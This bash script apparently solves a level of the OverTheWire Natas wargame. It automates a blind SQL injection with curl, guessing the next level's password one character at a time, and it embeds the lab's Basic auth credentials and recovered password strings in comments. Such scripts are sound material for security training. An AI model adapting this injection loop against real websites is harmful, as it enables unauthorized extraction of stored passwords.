#!/bin/bash

function request2 {
curl 'http://natas15.natas.labs.overthewire.org/index.php?debug=true' -H 'Host: natas15.natas.labs.overthewire.org' -H 'User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:57.0) Gecko/20100101 Firefox/57.0' -H 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8' -H 'Accept-Language: en-US,en;q=0.5' --compressed -H 'Referer: http://natas15.natas.labs.overthewire.org/index.php' -H 'Content-Type: application/x-www-form-urlencoded' -H 'Cookie: __cfduid=de0523e909d632d5483862cfcd1dd63241509737075' -H 'DNT: 1' -H 'Authorization: Basic bmF0YXMxNTpBd1dqMHc1Y3Z4clppT05nWjlKNXN0TlZrbXhkazM5Sg==' -H 'Connection: keep-alive' -H 'Upgrade-Insecure-Requests: 1' --data "username=${1}"
}

###SELECT * from users where username="q" OR SUBSTRING(password,1,1)="a"
#for x in {0..9}
pass=()
for n in {1..33}
do
	#for x in {41..120}
	for x in {41..123}
	#for x in {A..Z}
	do
		uname="natas16%22+AND+ascii(substring(password,${n},1))%3E%22${x}"
		if !(request2 ${uname} | grep 'exists')
			then 
				echo "FOUND!"
				pass+=($x)
				break
		fi
		sleep 2
	done
done

echo ${pass[@]} > pass.txt
#WaIHDabi63wnNIBROHeqi3p9t0m5nhmh
#wwnNIBROHeqi3J9t0m5nhmh
##87 97
